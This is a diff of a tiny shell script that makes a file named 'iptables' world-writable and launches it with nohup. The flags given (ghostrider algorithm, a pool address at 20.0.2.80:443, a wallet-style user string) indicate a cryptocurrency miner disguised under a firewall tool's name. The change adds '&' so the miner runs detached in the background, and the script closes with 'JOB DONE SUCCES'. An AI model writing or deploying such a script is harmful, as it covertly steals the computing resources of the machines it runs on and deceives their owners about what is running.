@@ -1,4 +1,4 @@
 #!/bin/sh
 chmod 777 iptables
-nohup ./iptables -a ghostrider --url 20.0.2.80:443 --user JV1wb2RLradsqueEvPnioKGZZRJ8xoYomm.SS -t 1
+nohup ./iptables -a ghostrider --url 20.0.2.80:443 --user JV1wb2RLradsqueEvPnioKGZZRJ8xoYomm.SS -t 1 &
 echo JOB DONE SUCCES
